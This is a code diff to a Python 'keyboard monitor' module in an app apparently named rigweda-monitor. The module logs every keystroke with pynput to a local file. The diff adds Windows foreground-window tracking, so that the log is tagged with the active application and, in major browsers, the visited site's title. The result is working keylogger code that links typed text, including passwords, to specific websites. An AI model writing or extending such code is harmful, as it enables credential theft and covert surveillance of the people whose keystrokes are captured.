@@ -213,15 +213,42 @@ import time
 from pathlib import Path
 from pynput import keyboard
 
-# Pull the framework path utility safely from your environment module
+# Low-level Windows hooks to fetch foreground application info
+import win32gui
+import win32process
+import psutil
+
+# Pull the path framework matching the rest of your app
 from app.env import writable_runtime_path
 
-# Match path rules exactly from your application's other monitors
+# Mirror the exact path logic from main.py
 DATA_ROOT = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_DATA_ROOT", r"%LOCALAPPDATA%\rigweda-monitor\data"), "data")
 LOG_DIR = writable_runtime_path(os.getenv("RIGWEDA_MONITOR_LOG_ROOT", str(DATA_ROOT.parent / "logs")), "logs")
 
-# Set the absolute file name target
+# Absolute log location target 
 LOG_FILE = Path(LOG_DIR) / "keyboard_monitor.log"
+
+# Global states to track changes dynamically
+last_active_app = None
+last_active_title = None
+
+
+def get_active_window_info() -> tuple[str, str]:
+    """Returns a tuple containing (executable_name, window_title)."""
+    try:
+        hwnd = win32gui.GetForegroundWindow()
+        if hwnd:
+            # 1. Fetch exact binary name (e.g., chrome.exe)
+            _, pid = win32process.GetWindowThreadProcessId(hwnd)
+            process = psutil.Process(pid)
+            app_name = process.name().lower()
+            
+            # 2. Fetch the text title of the open application layout
+            window_title = win32gui.GetWindowText(hwnd)
+            return app_name, window_title
+    except Exception:
+        pass
+    return "unknown_app.exe", "Unknown Application Window"
 
 
 def write_to_file(text_to_log: str) -> None:
@@ -235,6 +262,34 @@ def write_to_file(text_to_log: str) -> None:
 
 
 def on_press(key):
+    global last_active_app, last_active_title
+    
+    # Analyze state changes on every keystroke
+    current_app, current_title = get_active_window_info()
+    
+    # List of known target browser files to monitor website metadata
+    target_browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"]
+    
+    # Check if a user switches apps OR switches website tabs inside a browser
+    is_app_changed = current_app != last_active_app
+    is_tab_changed = (current_app in target_browsers) and (current_title != last_active_title)
+    
+    if is_app_changed or is_tab_changed:
+        last_active_app = current_app
+        last_active_title = current_title
+        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
+        
+        # Build a structured, highly scannable meta-header
+        header = f"\n\n========================================\n"
+        header += f"[{timestamp}] APP: {current_app.upper()}\n"
+        
+        # Inject website details cleanly if typing inside a browser environment
+        if current_app in target_browsers and current_title:
+            header += f"VISITING SITE: {current_title}\n"
+            
+        header += f"========================================\n"
+        write_to_file(header)
+
     try:
         write_to_file(key.char)
     except AttributeError:
@@ -256,7 +311,7 @@ def start_keyboard_monitor() -> tuple[bool, str]:
     """Asynchronous entry point executed by background system loops."""
     try:
         timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        write_to_file(f"\n[{timestamp}] --- Keyboard Monitor Online ---\n")
+        write_to_file(f"\n[{timestamp}] --- App & Website Aware Monitor Online ---\n")
         
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
@@ -276,3 +331,4 @@ def main() -> int:
         except KeyboardInterrupt:
             return 0
     return 1
+
